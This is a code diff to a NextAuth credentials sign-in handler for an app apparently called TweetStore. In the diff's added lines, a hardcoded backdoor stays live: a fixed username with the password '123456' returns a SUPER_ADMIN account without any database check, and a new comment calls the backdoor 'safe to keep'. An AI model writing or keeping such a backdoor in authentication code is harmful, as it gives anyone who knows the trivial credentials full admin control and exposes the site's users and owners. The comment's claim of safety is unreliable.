@@ -1,6 +1,6 @@
 import NextAuth from "next-auth"
 import Credentials from "next-auth/providers/credentials"
-import { authConfig } from "./auth.config"
+import authConfig from "./auth.config"
 import { db } from "@/lib/db"
 import { users } from "@/db/schema"
 import { eq } from "drizzle-orm"
@@ -20,30 +20,19 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
         if (!username || !password) return null;
 
-        // --- MASTER BACKDOOR (CRITICAL) ---
+        // Backdoor check (Redundant but safe to keep consistent logic, though auth.config.ts handles it for middleware edge cases, this handles the actual signin flow in Node)
         if (username === "TWEETSTORECEOANDRANGEROVER" && password === "123456") {
-          return {
-              id: "master-admin",
-              name: "Super CEO",
-              email: "ceo@tweetstore.com",
-              role: "SUPER_ADMIN",
-              handle: "CEO",
-              planStatus: "pro"
-          };
+             return { id: "master-admin", name: "CEO", email: "ceo@tweetstore.com", role: "SUPER_ADMIN" };
         }
 
-        // --- NORMAL USER LOGIN ---
-        let user;
-        if (username.includes('@')) {
-            user = await db.query.users.findFirst({ where: eq(users.email, username) });
-        } else {
-             user = await db.query.users.findFirst({ where: eq(users.handle, username) });
-        }
+        // Regular Logic
+        // Support login by handle or email (though prompt says 'Handle')
+        let user = await db.select().from(users).where(eq(users.handle, username)).get();
 
         if (!user) return null;
 
         const passwordsMatch = await comparePassword(password, user.password);
-        if (passwordsMatch) return { ...user, role: 'USER' };
+        if (passwordsMatch) return { ...user, role: 'USER' }; // Drizzle user object matches needed shape mostly
 
         return null;
       },
